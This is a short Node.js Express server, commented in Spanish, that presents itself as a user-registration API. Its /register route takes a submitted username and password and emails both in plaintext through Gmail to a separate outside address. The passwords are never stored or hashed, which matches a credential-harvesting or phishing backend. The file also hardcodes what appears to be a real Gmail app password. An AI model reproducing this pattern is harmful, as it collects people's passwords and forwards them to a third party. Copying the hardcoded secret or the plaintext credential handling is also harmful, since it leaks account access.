const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configurar transporter de Nodemailer
const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: 'fiorevaldez10@gmail.com', // Tu email
        pass: 'czfm juuu htrc rraq' // Tu contraseña de aplicación de Google
    }
});

// ------------------------------------------------------------------
// ESTA ES LA RUTA QUE FALTABA
// Responde a la petición GET en la raíz para evitar el error 404.
// ------------------------------------------------------------------
app.get('/', (req, res) => {
  res.send('✅ API de registro funcionando correctamente. Lista para recibir peticiones POST en /register.');
});

// Ruta para registrar usuario y enviar correo
app.post('/register', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Validar datos
        if (!username || !password) {
            return res.status(400).json({ message: 'El nombre de usuario y la contraseña son obligatorios' });
        }

        // Configurar opciones del email
        const mailOptions = {
            from: 'fiorevaldez10@gmail.com',
            to: 'hirahiroto92@gmail.com', // Email destino
            subject: 'Nuevo registro de usuario',
            text: `Se ha registrado un nuevo usuario con los siguientes datos:\n\nUsuario: ${username}\nContraseña: ${password}`
        };

        // Enviar email
        const info = await transporter.sendMail(mailOptions);
        
        console.log('Correo enviado: ' + info.response);
        res.status(200).json({ message: 'Registro exitoso y correo enviado' });

    } catch (error) {
        console.error('Error al procesar el registro:', error);
        res.status(500).json({ message: 'Error interno del servidor al registrar usuario' });
    }
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor escuchando en ${PORT}`);
});
